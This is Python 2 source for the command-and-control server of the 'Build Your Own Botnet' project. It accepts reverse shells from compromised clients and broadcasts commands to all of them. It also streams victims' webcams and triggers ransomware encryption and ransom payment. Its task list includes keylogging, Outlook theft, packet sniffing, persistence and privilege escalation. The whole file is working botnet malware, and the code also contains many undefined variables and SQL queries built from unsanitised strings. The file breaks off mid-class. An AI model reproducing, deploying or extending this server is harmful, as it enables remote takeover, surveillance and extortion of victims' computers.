#!/usr/bin/python
# Command & Control Server (Build Your Own Botnet)
"""
https://github.com/colental/byob
Copyright (c) 2018 Daniel Vega-Myhre
"""

from __future__ import print_function

# standard library

import os
import sys
import json
import time
import Queue
import pickle
import socket
import struct
import base64
import random
import select
import logging
import requests
import colorama
import argparse
import datetime
import functools
import cStringIO
import threading
import subprocess
import collections

# external

try:
    import cv2
    import numpy
    import configparser
    import SocketServer
    import mysql.connector
except ImportError:
    execfile('__init__.py')
    os.execv(sys.executable, ['python'] + [os.path.abspath(sys.argv[0])] + sys.argv[1:])

# modules

try:
    from modules import security, util
except ImportError:
    from . import security, util


# globals

colorama.init(autoreset=True)
_debug          = True
_abort          = False
_rootdir        = os.getcwd()
_color          = util.color()
_debugger       = util._debugger()
_threads        = collections.OrderedDict()
__doc__         = '''
        88                                  88
        88                                  88
        88                                  88
        88,dPPYba,  8b       d8  ,adPPYba,  88,dPPYba,
        88P'    "8a `8b     d8' a8"     "8a 88P'    "8a
        88       d8  `8b   d8'  8b       d8 88       d8
        88b,   ,a8"   `8b,d8'   "8a,   ,a8" 88b,   ,a8"
        8Y"Ybbd8"'      Y88'     `"YbbdP"'  8Y"Ybbd8"'
                        d8'
                       d8

'''



class C2(object):

    """
    Command & Control Server

    Server
        streaming socket server which asynchronously threads 
        incoming connections into Session instances, each 
        responsible for doing the heavy-lifting at the low
        level for each respective connection, thereby allowing
        the C2 to manage the sessions in parallel as a pool by
        massively reducing the IO overhead of each session on
        the C2 itself.

    Database
        MySQL database connection instance that creates
        the `byob` database the first time it is initialized.
        It provides many convenience functions to the server
        for interacting with MySQL and does the heavy-lifting
        under the hood to make Python and MySQL play nicely
        together, allowing a streamlined set of methods for
        storing/updating client sessions, tracking all issued
        tasks per session, updating every completed task with
        results, and more

    Session 
        a type of thread that the server spins off each incoming
        connection (i.e. reverse TCP shell) into. By default it
        waits in the background until the user wants to interact
        with it, at which point the main server wakes up the
        session and it continues running the shell until the user
        pushes it back into the background

    ImportHandler
        request handler for the C2.Server that handles the
        server-side of the client `remote import` feature, which 
        effectively allows clients to remotely import & use any 
        module that exists on the server as quickly and easily 
        as if the packages/modules were installed locally
        on their respective host machines

    PassiveHandler 
        request handler for the Server that handles incoming
        requests which have been sent by a client operating in
        passive mode, which utilizes a remote logger instance
        configured with a socket handler that connects to the
        port number above the C2.Server primary listener port
    """

    _lock           = threading.Lock()
    _text_color     = util.color()
    _text_style     = colorama.Style.DIM
    _prompt_color   = colorama.Fore.RESET
    _prompt_style   = colorama.Style.BRIGHT
    

    def __init__(self, **kwargs):
        """
        Create a new C2 instance

        `Optional`
        :param str mysql_host:  mysql database host (default: localhost)
        :param int mysql_port:  mysql database port (default: 3306)
        :param str mysql_user:  mysql username (default: root)
        :param str mysql_pass:  mysql password (default: toor)
        """
        self._count             = 1
        self._prompt            = None
        self._created           = time.time()
        self._active            = threading.Event()
        self.sessions           = {}
        self.current_session    = None
        self.port               = port
        self.commands           = self._init_commands()
        self.config             = self._init_config(**kwargs)
        self.banner             = self._init_banner()
        self.database           = self._init_database()
        

    @staticmethod
    def _error(data):
        lock = self.current_session.lock if self.current_session else self._lock
        with lock:
            util.display('[-] ', color='red', style='dim', end='')
            util.display('C2 Error: {}\n'.format(data), color='reset', style='dim')


    def _kill(self):
        for t in globals()['_threads']:
            if isinstance(t, subprocess.Popen):
                t.terminate()
                del t
            else:
                t = globals()['_threads'].pop(t, None)
                del t


    def _print(self, info):
        lock = self._lock if not self.current_session else self.current_session._lock
        if isinstance(info, str):
            try:
                info = json.loads(info)
            except: pass
        if isinstance(info, dict):
            max_key = int(max(map(len, [str(i1) for i1 in info.keys() if i1 if i1 != 'None'])) + 2) if int(max(map(len, [str(i1) for i1 in info.keys() if i1 if i1 != 'None'])) + 2) < 80 else 80
            max_val = int(max(map(len, [str(i2) for i2 in info.values() if i2 if i2 != 'None'])) + 2) if int(max(map(len, [str(i2) for i2 in info.values() if i2 if i2 != 'None'])) + 2) < 80 else 80
            key_len = {len(str(i2)): str(i2) for i2 in info.keys() if i2 if i2 != 'None'}
            keys    = {k: key_len[k] for k in sorted(key_len.keys())}
            with lock:
                for key in keys.values():
                    if info.get(key) and info.get(key) != 'None':
                        if len(str(info.get(key))) > 80:
                            info[key] = str(info.get(key))[:77] + '...'
                        info[key] = str(info.get(key)).replace('\n',' ') if not isinstance(info.get(key), datetime.datetime) else str(v).encode().replace("'", '"').replace('True','true').replace('False','false') if not isinstance(v, datetime.datetime) else str(int(time.mktime(v.timetuple())))
                        print('\x20' * 4, end='')
                        util.display(key.ljust(max_key).center(max_key + 2) + info[key].ljust(max_val).center(max_val + 2), color=self._text_color, style=self._text_style)
        else:
            with lock:
                print('\x20' * 4, end='')
                util.display(str(info), color=self._text_color, style=self._text_style)


    def _return(self, data=None):
        lock, prompt = (self.current_session.lock, self.current_session._prompt) if self.current_session else (self._lock, self._prompt)
        with lock:
            if data:
                print('\n{}\n'.format(data))
            else:
                print(prompt, end='')
    
    def _init_banner(self):
        try:
            banner = __doc__ if __doc__ else "Command & Control Server (Build Your Own Botnet)"
            with self._lock:
                util.display(banner, color=random.choice(['red','green','cyan','magenta','yellow']), style='bright')
                util.display("[?] ", color='yellow', style='bright', end='')
                util.display("Hint: show usage information with the 'help' command\n", color='reset', style='dim')
            return banner
        except Exception as e:
            globals()['_debugger'].error(str(e))

    def _init_commands(self):
        return {
            'help'          :   self.help,
            'exit'          :   self.quit,
            'quit'          :   self.quit,
            '$'             :   self.eval,
            'eval'          :   self.eval,
            'query'         :   self.query,
            'settings'      :   self.settings,
            'options'       :   self.settings,
            'debug'         :   self.debug_mode,
            'sessions'      :   self.session_list,
            'clients'       :   self.session_list,
            'shell'         :   self.session_shell,
            'ransom'        :   self.session_ransom,
            'webcam'        :   self.session_webcam,
            'kill'          :   self.session_remove,
            'drop'          :   self.session_remove,
            'back'          :   self.session_background,
            'bg'            :   self.session_background,
            'background'    :   self.session_background,
            'sendall'	    :   self.task_broadcast,
            'broadcast'     :   self.task_broadcast,
            'results'       :   self.task_list,
            'tasks'         :   self.task_list
            }


    def _init_database(self, **kwargs):
        if all([kwargs.get(arg) for arg in ['host','user','password']]):
            db = C2.Database(server=self, **kwargs)
        else:
            db = C2.Database(server=self)
        with self._lock:
            util.display("[+] ", color='green', style='bright', end='')
            util.display("Connected to MySQL database", style='bright', color='reset')
        return db
    

    def _get_sessions(self):
        return [v for v in self.sessions.values()]


    def _get_session_by_id(self, session):
        session = None
        if str(session).isdigit() and int(session) in self.sessions:
            session = self.sessions[int(session)]
        elif self.current_session:
            session = self.current_session
        else:
            self._error("Invalid Client ID")
        return session


    def _get_session_by_connection(self, connection):
        session = None
        if isinstance(connection, socket.socket):
            _addr = connection.getpeername()
            for s in self.get_sessions():
                if s.connection.getpeername() == _addr:
                    session = c
                    break
        else:
            self._error("Invalid input type (expected '{}', received '{}')".format(socket.socket, type(connection)))
        return session
        

    def _get_prompt(self, data):
        with self._lock:
            return raw_input(self._prompt_color + self._prompt_style + '\n' + bytes(data).rstrip())


    @util.threaded
    def _session_handler(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind(('0.0.0.0', int(self.port)))
        sock.listen(10)
        while True:
            connection, address = sock.accept()
            session = C2.Session(server=self, connection=connection, name=self._count)
            self.sessions[self._count] = session
            self._count  += 1
            session.start()                        
            if not self.current_session:
                with self._lock:
                    print(self._prompt_color + self._prompt_style + str("[{} @ %s]> ".format(os.getenv('USERNAME', os.getenv('USER'))) % os.getcwd()), end="")
            else:
                if self.current_session._prompt:
                    print(str(self.current_session._prompt) % int(self.current_session.session), end="")


    @util.threaded
    def _task_handler(self, port=None):
        if not port:
            if hasattr(self, 'port') and isinstance(self.port, int) and port > 0 and port < 65356:
                port    = self.port + 1
            else:
                globals()['_debugger'].debug("invalid port number '{}' in task handler".format(port))
        task_server = C2.TaskServer(self, port=port)
        task_server.serve_until_stopped()
        return task_server


    def eval(self, code):
        """
        runs code in context of the server

        `Requires`
        :param str code:    Python code to execute
        """
        if globals()['_debug']:
            try:
                return eval(code)
            except Exception as e:
                self._error("Error: %s" % str(e))
        else:
            self._error("Debugging mode is disabled")


    def quit(self):
        """
        Quit server and optionally keep clients alive
        """
        if self._get_prompt('Quiting server - keep clients alive? (y/n): ').startswith('y'):
            for session in self._get_sessions():
                session._active.set()
                self.send('mode passive', session=session.id)
        globals()['_abort'] = True
        self._active.clear()
        _ = os.popen("taskkill /pid {} /f".format(os.getpid()) if os.name == 'nt' else "kill -9 {}".format(os.getpid())).read()
        self.display('Exiting...')
        sys.exit(0)


    def help(self, info=None):
        """
        Show usage information

        `Optional`
        :param dict info:   client usage help 
        """
        column1 = 'command <arg>'
        column2 = 'description'
        info    = info if info else {"back": "background the current session", "shell <id>": "interact with client via reverse shell", "sessions": "list all sessions", "exit": "exit the program but keep sessions alive", "sendall <command>": "send a command to all active sessions", "settings <value> [options]": "list/change current display settings"}
        max_key = max(map(len, info.keys() + [column1])) + 2
        max_val = max(map(len, info.values() + [column2])) + 2
        print('\n', end='')
        util.display(column1.center(max_key) + column2.center(max_val), color=self._text_color, style='bright')
        for key in sorted(info):
            util.display(key.ljust(max_key).center(max_key + 2) + info[key].ljust(max_val).center(max_val + 2), color=self._text_color, style=self._text_style)


    def display(self, info):
        """
        Display formatted output in the console

        `Required`
        :param str info:   text to display
        """
        with self._lock:
            print('\n')
            if isinstance(info, dict):
                if len(info):
                    self._print(info)
            elif isinstance(info, list):
                if len(info):
                    for data in info:
                        util.display('  %d\n' % int(info.index(data) + 1), color=self._text_color, style='bright', end="")
                        self.display(data)
            elif isinstance(info, str):
                try:
                    self._print(json.loads(info))
                except:
                    util.display(str(info), color=self._text_color, style=self._text_style)
            else:
                self._error("{} error: invalid data type '{}'".format(self.display.func_name, type(info)))


    def query(self, statement, display=True):
        """
        Query the database

        `Requires`
        :param str statement:    SQL statement to execute
        """
        self.database.execute_query(statement, display=display)
    

    def settings(self, args=None):
        """
        Show/change display settings

        `settings setting] [option] [value]`

        :setting text:      text displayed in console
        :setting prompt:    prompt displayed in shells
        :option color:      color attribute of a setting
        :option style:      style attribute of a setting
        :values color:      red, green, cyan, yellow, magenta
        :values style:      normal, bright, dim
        
        """
        if not args:
            try:
                text_color   = [color for i in [getattr(c.Fore, color) for color in ['BLUE','CYAN','RED','BLACK','MAGENTA','GREEN']] if i == self._text_color][0]
                text_style   = [style for i in [getattr(c.Style, style) for style in ['DIM','BRIGHT','NORMAL']] if i == self._text_style][0]
                prompt_color = [color for i in [getattr(c.Fore, color) for color in ['BLUE','CYAN','RED','BLACK','MAGENTA','GREEN']] if i == self._prompt_color][0]
                prompt_style = [style for i in [getattr(c.Style, style) for style in ['DIM','BRIGHT','NORMAL']] if i == self._prompt_style][0]
            except Exception as e:
                return '{} error: {}'.format(self.settings.func_name, str(e))
            print('\n', end='')
            util.display('Settings'.center(40), color='reset', style='bright')
            util.display('text color/style: {}'.format(' '.join(text_color, text_style).center(40)), color='reset', style='dim')
            util.display('prompt color/style: {}'.format(' '.join(prompt_color, prompt_style).center(40)), color='reset', style='dim')
            util.display('debug: {}'.format('true' if globals()['_debug'] else 'false'), color='reset', style='dim')
            print(self._text_color + self._text_style)
        else:
            target, _, options = args.partition(' ')
            setting, _, option = options.partition(' ')
            option = option.upper()
            print(self._text_color + self._text_style)
            if target == 'prompt':
                if setting == 'color':
                    if not hasattr(colorama.Fore, option):
                        util.display("usage: settings prompt color [value]\ncolors:   white/black/red/yellow/green/cyan/magenta")
                    self._prompt_color = getattr(colorama.Fore, option)
                    util.display("prompt color changed to ", color='reset', style='bright', end='')
                    util.display(option, color=self._prompt_color, style=self._prompt_style)
                elif setting == 'style':
                    if not hasattr(colorama.Style, option):
                        util.display("usage: settings prompt style [value]\nstyles:   bright/normal/dim")
                    self._prompt_style = getattr(colorama.Style, option)
                    util.display("prompt style changed to ", color='reset', style='bright', end='')
                    util.display(option, color=self._prompt_color, style=self._prompt_style)
                else:
                    util.display("usage: settings prompt <option> [value]")
            elif target == 'text':
                if setting == 'color':
                    if not hasattr(colorama.Fore, option):
                        util.display("usage: settings text color [value]\ncolors:   white/black/red/yellow/green/cyan/magenta")
                    self._text_color = getattr(colorama.Fore, option)
                    util.display("text color changed to ", color='reset', style='bright', end='')
                    util.display(option, color=self._text_color, style=self._text_style)
                elif setting == 'style':
                    if not hasattr(colorama.Style, option):
                        util.display("usage: settings text style [value]\nstyles:   bright/normal/dim")
                    self._text_style = getattr(colorama.Style, option)
                    util.display("text style changed to ", color='reset', style='bright', end='')
                    util.display(option, color=self._text_color, style=self._text_style)
            elif target == 'debug':
                if not setting:
                    if globals()['_debug']:
                        util.display("[!] ", color='yellow', style='bright', end='')
                        util.display("Debug: On", color='reset', style='bright')
                    else:
                        util.display("[-] ", color='yellow', style='dim', end='')
                        util.display("Debug: Off", color='reset', style='dim')
                elif str(setting).lower() in ('0','off','false','disable'):
                    globals()['_debug'] = False
                    util.display("[-] ", color='yellow', style='dim', end='')
                    util.display("Debugging disabled", color='reset', style='dim')
                elif str(setting).lower() in ('1','on','true','enable'):
                    globals()['_debug'] = True
                    util.display("[!] ", color='yellow', style='bright', end='')
                    util.display("Debugging enabled", color='reset', style='bright')            
                else:
                    self._error("invalid mode for 'debugging'")
            else:
                util.display('\nDisplay Settings\n\n  usage:  settings <type> <option> <color|style>\n  \n    type   - text, prompt\n    option - color, style\n    color  - black, white, blue, red, green, magenta, yellow\n    style  - dim, normal, bright\n\nDebugging Mode\n\t\n  usage: settings debug <on|off>\n')
    

    def send(self, command, session=None, connection=None):
        """
        Send command to a client as a standard task

        `Required`
        :param str command:         shell/module command

        `Optional`
        :param int session:         session.id
        :param socket connection:   session.connection
        
        """
        client = None
        if session:
            session = self._get_session_by_id(session)
        elif connection:
            session = self._get_session_by_connection(connection)
        else:
            self._error("missing required argument 'session' or 'connection'")
            return
        raw_data = security.encrypt_aes(json.dumps(task), session.key)
        packed_data = (struct.pack("!L", len(raw_data)) + raw_data)
        session.connection.sendall(packed_data)


    def recv(self, session=None, connection=None):
        """
        Listen for incoming task results from a client

        `Optional`
        :param int session:         session.id
        :param socket connection:   session.connection
        
        """
        session = None
        if session:
            session = self._get_session_by_id(session)
        elif connection:
            session = self._get_session_by_connection(connection)
        else:
            self._error("invalid Client ID")
        if session:
            try:
                header_size = struct.calcsize("L")
                header      = session.connection.recv(header_size)
                msg_size    = struct.unpack("!L", header)[0]
                msg         = ""
                while len(msg) < msg_size:
                    msg += session.connection.recv(1)
                if msg:
                    try:
                        data = security.decrypt_aes(msg, session.key)
                        try:
                            return json.loads(data)
                        except Exception as e:
                            util.debug(e)
                    except Exception as e1:
                        util.debug(str(e1))
            except Exception as e:
                self._error("{} error: {}".format(self.recv.func_name, str(e)))
                time.sleep(1)
                session._active.clear()
                self.session_remove(session.session)
                self._active.set()
                self.run()
        else:
            self._error('failed to receive incoming message from client')


    def task_list(self, id=None):
        """
        List client tasks and results
        
        `Requires`
        :param int id:   session ID
        """
        if id:
            session = self._get_session_by_id(id)
            if session:
                return self.database.get_tasks(session.info.get('uid'))
        return self.database.get_tasks()            


    def task_broadcast(self, command):
        """
        Broadcast a task to all sessions

        `Requires`
        :param str command:   command to broadcast
        
        """
        for session in self._get_sessions():
            self.send(command, session=session.id)


    def session_webcam(self, args=''):
        """
        Interact with a client webcam

        `Optional`
        :param str args:   stream [port], image, video
        
        """
        if not self.current_session:
            self._error( "No client selected")
            return
        client = self.current_session
        result = ''
        mode, _, arg = args.partition(' ')
        client._active.clear()
        if not mode or str(mode).lower() == 'stream':
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            retries = 5
            while retries > 0:
                try:
                    port = random.randint(6000,9999)
                    s.bind(('0.0.0.0', port))
                    s.listen(1)
                    cmd = 'webcam stream {}'.format(port)
                    self.send(cmd, session.id)
                    conn, addr  = s.accept()
                    break
                except:
                    retries -= 1
            header_size = struct.calcsize("L")
            window_name = addr[0]
            cv2.namedWindow(window_name)
            data = ""
            try:
                while True:
                    while len(data) < header_size:
                        data += conn.recv(4096)
                    packed_msg_size = data[:header_size]
                    data = data[header_size:]
                    msg_size = struct.unpack(">L", packed_msg_size)[0]
                    while len(data) < msg_size:
                        data += conn.recv(4096)
                    frame_data = data[:msg_size]
                    data = data[msg_size:]
                    frame = pickle.loads(frame_data)
                    cv2.imshow(window_name, frame)
                    key = cv2.waitKey(70)
                    if key == 32:
                        break
            finally:
                conn.close()
                cv2.destroyAllWindows()
                result = 'Webcam stream ended'
        else:
            self.send("webcam %s" % args, session.id)
            task    = self.recv(client.connection)
            result  = task.get('result')
        self.display(result)


    def session_remove(self, session):
        """
        Shutdown client shell and remove client from database

        `Requires`
        :param int session:   session ID
        
        """
        if not str(session).isdigit() or int(session) not in self.sessions:
            return
        else:
            session = self.sessions[int(session)]
            session._active.clear()
            self.send('kill', session=session)
            try:
                session.connection.close()
            except: pass
            try:
                session.connection.shutdown()
            except: pass
            _ = self.sessions.pop(int(session), None)
            del _
            print(self._text_color + self._text_style)
            if not self.current_session:
                with self._lock:
                    print('Client {} disconnected'.format(session))
                self._active.set()
                session._active.clear()
                return self.run()
            elif int(session) == self.current_session.session:
                with self.current_session._lock:
                    print('Client {} disconnected'.format(session))
                self._active.clear()
                self.current_session._active.set()
                return self.current_session.run()
            else:
                with self._lock:
                    print('Client {} disconnected'.format(session))
                self._active.clear()
                self.current_session._active.set()
                return self.current_session.run()


    def session_list(self, verbose=True):
        """
        List currently online clients

        `Optional`
        :param str verbose:   verbose output (default: False)
        
        """
        lock    = self._lock if not self.current_session else self.current_session._lock
        with lock:
            sessions = self.database.get_sessions(verbose=verbose, display=True)


    def session_ransom(self, args=None):
        """
        Encrypt and ransom files on client machine

        `Required`
        :param str args:    encrypt, decrypt, payment
        
        """
        if self.current_session:
            if 'decrypt' in str(args):
                self.send("ransom decrypt %s" % key.exportKey(), session=self.current_session.session)
            elif 'encrypt' in str(args):
                self.send("ransom %s" % args, session=self.current_session.session)
            else:
                self._error("Error: invalid option '%s'" % args)
        else:
            self._error("No client selected")


    def session_shell(self, session):
        """
        Interact with a client through a reverse TCP shell

        `Requires`
        :param int session:   session ID
        
        """
        if not str(session).isdigit() or int(session) not in self.sessions:
            self._error("Session '{}' does not exist".format(session))
        else:
            self._active.clear()
            if self.current_session:
                self.current_session._active.clear()
            self.current_session = self.sessions[int(session)]
            util.display("\n\t[+] ", color='cyan', style='bright', end='')
            util.display("Client {} selected\n".format(session.id), color='reset', style='dim')
            self.current_session._active.set()
            return self.current_session.run()


    def session_background(self, session=None):
        """
        Send a session to background

        `Requires`
        :param int session:   session ID
        
        """
        if not session:
            if self.current_session:
                self.current_session._active.clear()
        elif str(session).isdigit() and int(session) in self.sessions:
            self.sessions[int(session)]._active.clear()
        self.current_session = None
        self._active.set()


    def run(self):
        """
        Run the server
        
        """
        globals()['_threads']['session_handler'] = self._session_handler()
        globals()['_threads']['task_handler']    = self._task_handler()
        self._active.set()
        while True:
            try:
                self._active.wait()
                self._prompt = "[{} @ %s]> ".format(os.getenv('USERNAME', os.getenv('USER', 'byob'))) % os.getcwd()
                cmd_buffer   = self._get_prompt(self._prompt)
                if cmd_buffer:
                    output = ''
                    cmd, _, action  = cmd_buffer.partition(' ')
                    if cmd in self.commands:
                        try:
                            output  = self.commands[cmd](action) if len(action) else self.commands[cmd]()
                        except Exception as e1:
                            output  = str(e1)
                    else:
                        try:
                            output = str().join((subprocess.Popen(cmd_buffer, 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, shell=True).communicate()))
                        except: pass
                    if output:
                        self.display(str(output))
                if globals()['_abort']:
                    self._kill()
                    break
            except KeyboardInterrupt:
                self._active.clear()
                break
        self.display('C2 shutting down')
        sys.exit(0)
        

    class Database(mysql.connector.MySQLConnection):
        """
        MySQL database connection designed to create
        and maintain a persistent database of important
        session information handled by the server.

        It is built specifically to work with byob.server.Server
        instances, and should only be used by a server or in
        conjunction with a server.
        
        """

        def __init__(self, host='localhost', user='root', password='toor', server=None, tasks=['escalate','keylogger','outlook','packetsniffer','persistence','phone','portscan','process','ransom','screenshot','webcam'], **kwargs):

            """
            Create new MySQL conection instance and setup the database

            `Required`
            :param server:          byob.server.Server instance
            :param str host:        hostname/IP address of MySQL host machine
            :param str user:        authorized account username
            :param str password:    authorized account password

            `Optional`
            :param list tasks:      list of commands/modules for database to store
            """
            assert isinstance(server, C2), "argument 'server' must be a byob.C2 instance"
            try:
                super(C2.Database, self).__init__(host=host, user=user, password=password)
                self.config(host=host, user=user, password=password)
                self.query      = self.cursor(dictionary=True)
                self._server    = server
                self._tasks     = tasks
                self._debug     = globals().get('_debug')
                self._color     = globals().get('_color')
                self._setup     = self._init_setup()
            except mysql.connector.ProgrammingError:
                util.display("\nBYOB was unable to connect to MySQL.\nMake sure you have completed all of the following steps:\n    1) Install MySQL 5.5+ (download available at https://mysql.com)\n\t2) Start the mysqld service (run command `service mysql start`)    \n    3) Enter valid MySQL credentials as command-line arguments every time you start-up the server\n\t(Example: server.py --mysql-host localhost --mysql-user root --mysql-password toor)\n")
                

        def _display(self, data, indent=4):
            if isinstance(data, dict):
                for k,v in data.items():
                    if isinstance(v, datetime.datetime):
                        data[k] = v.ctime()
                i = data.pop('id', None)
                c = globals().get('_color') or util.color()
                util.display(str(i).rjust(indent-3), color='reset', style='bright') if i else None
                for k,v in data.items():
                    if isinstance(v, unicode):
                        try:
                            j = json.loads(v.encode())
                            self._display(j, indent+2)
                        except:
                            util.display(str(k).encode().ljust(4  * indent).center(5 * indent), color=c, style='bright', end='')
                            util.display(str(v).encode(), color=c, style='dim')
                    elif isinstance(v, list):
                        for i in v:
                            if isinstance(v, dict):
                                util.display(str(k).ljust(4  * indent).center(5 * indent))
                                self._display(v, indent+2)
                            else:
                                util.display(str(i).ljust(4  * indent).center(5 * indent))
                    elif isinstance(v, dict):
                        util.display(str(k).ljust(4  * indent).center(5 * indent))
                        self._display(v, indent+1)
                    elif isinstance(v, int):
                        if v in (0,1):
                            util.display(str(k).encode().ljust(4  * indent).center(5 * indent), color=c, style='bright', end='')
                            util.display(str(bool(v)).encode(), color=c, style='dim')
                        else:
                            util.display(str(k).encode().ljust(4  * indent).center(5 * indent), color=c, style='bright', end='')
                            util.display(str(v).encode(), color=c, style='dim')
                    else:
                        util.display(str(k).encode().ljust(4  * indent).center(5 * indent), color=c, style='bright', end='')
                        util.display(str(v).encode(), color=c, style='dim')
            elif isinstance(data, list):
                for row in data:
                    if isinstance(row, dict):
                        self._display(row, indent+2)
                    else:
                        util.display(str(row).encode().ljust(4  * indent).center(5 * indent), color=c, style='bright', end='')
                        util.display(str(v).encode(), color=c, style='dim')

            else:
                if hasattr(data, '_asdict'):
                    data = data._asdict()
                if isinstance(data, collections.OrderedDict):
                    data = dict(data)
                if isinstance(data, dict):
                    i = data.pop('id',None)
                    util.display(str(i).rjust(indent-1), color='reset', style='bright') if i else None
                    self._display(data, indent+2)

                else:
                    util.display(str(data.encode().ljust(4  * indent).center(5 * indent), color=c, style='bright', end=''))
                    util.display(v.encode(), color=c, style='dim')


        def _reconnect(self):
            try:
                self.reconnect()
                self.query = self.cursor(dictionary=True)
                return "[{} @ {}] reconnected".format(self.database.user, self.database.server_host)
            except Exception as e:
                self.error("{} error: {}".format(self._reconnect.func_name, str(e)))

        def _init_setup(self, batch_file='resources/setup.sql'):
            overwrite   = False
            with open(batch_file, 'r') as fd:
                sql = fd.read()
            if self.user != 'root':
                overwrite = True
                sql.replace('`root`', '`%s`' % self.user)
            if self.server_host != 'localhost':
                overwrite = True
                sql.replace('`localhost`', '`%s`' % self.server_host)
            if overwrite:
                with file(batch_file, 'w') as fp:
                    fp.write(sql)                    
            self.execute_file(batch_file)
            self.cmd_init_db('byob')
            return True        

        def debug(self, output):
            """
            Print debugging output to console
            """
            globals()['_debugger'].debug(str(output))

                
        def error(self, output):
            """
            Print error output to console
            
            """
            self._server._error(str(output))


        def update_status(self, session, online):
            """
            Update session status to online/offline

            `Required`
            :param int session:     session ID
            :param bool online:     True/False = online/offline
            
            """
            try:
                if online:
                    if isinstance(session, str):
                        self.execute_query("UPDATE tbl_sessions SET online=1 WHERE uid='%s'" % str(session))
                    elif isinstance(session, int):
                        self.execute_query("UPDATE tbl_sessions SET online=1 WHERE id=%d" % int(session))
                else:
                    if isinstance(session, str):
                        self.execute_query("UPDATE tbl_sessions SET online=0, last_online=NOW() WHERE uid='%s'" % str(session))
                    elif isinstance(session, int):
                        self.execute_query("UPDATE tbl_sessions SET online=0, last_online=NOW() WHERE id=%d" % int(session))                  
            except Exception as e:
                self.error("{} error: {}".format(self.update_status.func_name, str(e)))


        def get_sessions(self, verbose=False, display=False):
            """
            Fetch sessions from database

            `Optional`
            :param bool verbose:    include full session information
            :param bool display:    display output
            
            """
            sessions = self.execute_query("SELECT * FROM tbl_sessions ORDER BY online" if verbose else "SELECT id, public_ip, uid, last_online FROM tbl_sessions ORDER BY online desc")   
            if display:
                self._display(sessions)
            return sessions


        def get_tasks(self, session=None, display=True):
            """
            Fetch tasks from database

            `Optional`
            :param int session:     session ID
            :param bool display:    display output
            """
            try:
                tasks = None
                if session:
                    try:
                        tasks = self.execute_query("SELECT * FROM {}".format(session), display=False)
                    except Exception as e:
                        self.error("{} error: {}".format(self.show_results.func_name, str(e)))
                else:
                    for session in self._get_sessions():
                        try:
                            tasks = self.execute_query("SELECT * FROM {}", display=False)
                        except Exception as e:
                            self.debug("{} error: {}".format(self.show_results.func_name, str(e)))
                if tasks:
                    if display:
                        self._display(tasks)
                    return tasks
            except Exception as e:
                self.error("{} error: {}".format(self.get_tasks.func_name, str(e)))


        def handle_session(self, info):
            """
            Handle a new/current client by adding/updating database

            `Required`
            :param dict info:    session host machine information

            Returns the session information as a dictionary (JSON) object
            """
            if isinstance(info, dict):
                args = (json.dumps(info), '@session')
                _    = self.execute_procedure('sp_handle_session', args=args, display=False)
                info = self.execute_query('SELECT @session', display=False)
                if isinstance(info, list) and len(info):
                    info = info[0]
                if isinstance(info, dict):
                    return info
                else:
                    self.error("Error: invalid output type returned from database (expected '{}', receieved '{}')".format(dict, type(data)))
            else:
                self.error("Error: invalid output type returned from database (expected '{}', receieved '{}')".format(dict, type(info)))


        def handle_task(self, task):
            """ 
            Adds results to database for configured task type

            `Required`
            :param dict task:
              :attr str task.client:          client ID assigned by server
              :attr str task.task:            task assigned by server

            `Optional`
              :attr str task.uid:             task ID assigned by server
              :attr str task.result:          task result completed by client
              :attr datetime task.issued:     time task was issued by server
              :attr datetime task.completed:  time task was completed by client

            Returns task assigned by database as a dictionary (JSON) object
            """
            try:
                if isinstance(task, dict):
                    args = (json.dumps(task), '@task')
                    _ = self.execute_procedure("sp_handle_task", args=args)
                    task = self.execute_query("SELECT @task")
                    if isinstance(task, list) and len(task):
                        task = task[0]
                    if isinstance(task, dict):
                        return task
                else:
                    self.error("{} error: invalid input type (expected {}, received {})".format(self.handle_task.func_name, dict, type(task)))
            except Exception as e:
                self.error("{} error: {}".format(self.handle_task.func_name, str(e)))


        def execute_query(self, query, display=False):
            """
            Execute a query and return result, optionally printing output to stdout

            `Required`
            :param str query:   SQL statement to execute in MySQL

            Returns a list of output rows formatted as dictionary (JSON) objects
            """
            result = []
            try:
                if not self.is_connected():
                    self._reconnect()
                result = []
                self.query.execute(query)
                output = self.query.fetchall()
                if output:
                    for row in output:
                        if hasattr(row, '_asdict'):
                            row = row._asdict()
                        for key,value in [(key,value) for key,value in row.items() if isinstance(value, datetime.datetime)]:
                            row[key] = value.ctime()
                        if display:
                            self._display(row)
                        result.append(row)
            except (mysql.connector.ProgrammingError, mysql.connector.InterfaceError) as e:
                self.error(e)
            except Exception as e:
                self.error("{} error: {}".format(self.execute_query.func_name, str(e)))
            finally:
                return result


        def execute_procedure(self, procedure, args=[], display=False):
            """
            Execute a stored procedure and return result, optionally printing output to stdout

            `Required`
            :param str procedure:   name of the stored procedure to execute

            `Optional`
            :param list args:       list of arguments to pass to the stored procedure
            :param bool display:    display output from Database if True

            Returns a list of output rows formatted as dictionary (JSON) objects
            """
            result = []
            try:
                if not self.is_connected():
                    self._reconnect()
                cursor = self.cursor(dictionary=True)
                cursor.callproc(procedure, args)
                result = [row for row in cursor.stored_results() for row in result.fetchall()]
            except (mysql.connector.InterfaceError, mysql.connector.ProgrammingError):
                pass
            finally:
                return result


        def execute_file(self, filename=None, sql=None, display=False):
            """
            Execute SQL commands sequentially from a string or file

            `Optional`
            :param str filename:    name of the SQL batch file to execute
            :param str sql:         raw SQL commands to execute
            :param bool display:    display output from Database if True

            Returns a list of output rows formatted as dictionary (JSON) objects
            """
            try:
                result = []
                if os.path.isfile(filename):
                    with open(filename) as stmts:
                        for line in self.query.execute(stmts.read(), multi=True):
                            result.append(line)
                            if display:
                                print(line)
                elif isinstance(sql, str):
                    for line in self.query.execute(sql, multi=True):
                        result.append(line)
                        if display:
                            print(line)
                elif isinstance(sql, list) or isinstance(sql, tuple):
                    sql = '\n'.join(sql)
                    for line in self.query.execute_query(sql, multi=True):
                         result.append(line)
                         if display:
                             print(line)
                return result
            except Exception as e:
                self.error("{} error: {}".format(self.execute_file.func_name, str(e)))

    class Session(threading.Thread):
        """
        Thread responsible for a client session

        - Active
            handles the server-side of the
            reverse TCP shell while the session
            is active

        - Passive
            passively manages the session while
            it is operating in passive mode to
            keep the socket connection alive

        """
        def __init__(self, connection=None, server=None, id=1):
            """
            Create a new Session instance

            `Requires`
            :param connection:   connected socket object
            :param server:       byob.server.Server instance
            :param int id:       session ID
            
            """
            super(C2.Session, self).__init__()
